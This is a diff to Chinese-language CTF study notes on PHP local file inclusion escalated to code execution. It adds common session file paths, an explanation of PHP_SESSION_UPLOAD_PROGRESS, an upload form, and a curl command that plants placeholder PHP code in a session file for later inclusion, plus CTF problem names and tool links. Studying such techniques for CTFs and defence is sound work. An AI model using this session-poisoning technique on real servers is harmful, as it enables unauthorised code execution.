@@ -66,7 +66,7 @@ session.save_path
 - 包含服务器日志
 - 读取服务器敏感文件
 
-#### 泄露文件内容
+## 泄露文件内容
 
 #### PHP FILTER CHAINS: FILE READ FROM ERROR-BASED ORACLE
 
@@ -74,7 +74,54 @@ session.save_path
 
 ## LFI2RCE
 
+### PHP 过滤器实现任意内容生成
+
 ### session 文件包含
+
+```
+/tmp/sess_<id>
+/tmp/sessions/sess_<id>
+/var/lib/php/sess_<id>
+/var/lib/php/sessions/sess_<id>
+/var/lib/php<version>/sess_<id>
+/var/lib/php<version>/sessions/sess_<id>
+...
+```
+
+### `PHP_SESSION_UPLOAD_PROGRESS`
+
+PHP_SESSION_UPLOAD_PROGRESS 是 PHP 中用于处理文件上传进度的特性，主要用于监控用户上传文件时的进度信息。
+
+`session.upload_progress.enabled`默认启用。
+`session.upload_progress.cleanup`默认启用，上传完成后会立即清除进度信息。
+
+```html
+<form action="http://localhost:13454/upload.php" method="post" enctype="multipart/form-data">
+    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
+    <input type="file" name="file" />
+    <input type="submit" value="上传文件" />
+</form>
+```
+
+<https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2018/one-line-php-challenge/exp_for_php.py>
+
+```bash
+curl http://<IP>:<PORT> --cookie 'PHPSESSID=test' -F 'PHP_SESSION_UPLOAD_PROGRESS=<PHP_CODE>' -F 'file=@junk_file'
+```
+
+```
+upload_progress_<PHP_CODE>|a:5:{s:10:”start_time”;i:1623754711;s:14:”content_length”;i:342;s:15:”bytes_processed”;i:342;s:4:”done”;b:1;s:5:”files”;a:1:{i:0;a:7:{s:10:”field_name”;s:4:”file”;s:4:”name”;s:9:”junk_file”;s:8:”tmp_name”;s:14:”/tmp/phpAelEHl”;s:5:”error”;i:0;s:4:”done”;b:1;s:10:”start_time”;i:1623754711;s:15:”bytes_processed”;i:17;}}}
+```
+
+`exp.py`:
+
+```python
+```
+
+- [第五空间 2021]EasyCleanup
+- QAQ_1inclu4e
+
+<https://d4rkstat1c.medium.com/mr-burns-hackthebox-writeup-c06f90a22fa9>
 
 ## 练习题
 
@@ -82,3 +129,5 @@ session.save_path
 - [羊城杯 2020]Easyphp2
 
 ## 参考资料
+
+- <https://github.com/D35m0nd142/LFISuite>
